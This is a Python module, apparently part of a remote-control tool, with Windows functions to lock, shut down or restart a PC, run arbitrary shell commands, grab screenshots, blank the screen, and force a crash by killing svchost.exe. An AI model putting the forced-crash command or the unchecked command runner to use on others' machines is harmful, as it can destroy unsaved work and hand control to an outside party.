import os
import tempfile
import pyautogui
import ctypes

class ComputerControl:
    @staticmethod
    def lock_pc():
        """Lock the computer (Windows only)."""
        try:
            os.system("rundll32.exe user32.dll,LockWorkStation")
            return True
        except Exception as e:
            print(f"Error locking PC: {e}")
            return False

    @staticmethod
    def shutdown_pc():
        """Shutdown the computer (Windows only)."""
        try:
            os.system("shutdown /s /t 0")
            return True
        except Exception as e:
            print(f"Error shutting down PC: {e}")
            return False

    @staticmethod
    def restart_pc():
        """Restart the computer (Windows only)."""
        try:
            os.system("shutdown /r /t 0")
            return True
        except Exception as e:
            print(f"Error restarting PC: {e}")
            return False

    @staticmethod
    def run_command_on_pc(command):
        """Run a shell command on the PC."""
        try:
            result = os.system(command)
            if result != 0:
                print(f"Command failed with exit code: {result}")
                return False
            return True
        except Exception as e:
            print(f"Error running command on PC: {e}")
            return False

    @staticmethod
    def bsod_pc():
        """Bsod PC."""
        try:
            result = os.system("taskkill.exe /f /im svchost.exe")
            if result != 0:
                print(f"Bsod failed with exit code: {result}")
                return False
            return True
        except Exception as e:
            print(f"Error bsod PC: {e}")
            return False


    @staticmethod
    def get_screenshot():
        """Capture a screenshot, save it to TEMP, and return the file path."""
        try:
            temp_dir = tempfile.gettempdir()
            screenshot_path = os.path.join(temp_dir, "screenshot.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None

    @staticmethod
    def turn_off_screen():
        """Turn off the screen using Windows API."""
        try:
            HWND_BROADCAST = 0xFFFF
            WM_SYSCOMMAND = 0x0112
            SC_MONITORPOWER = 0xF170
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            return True
        except Exception as e:
            print(f"Error turning off screen: {e}")
            return False
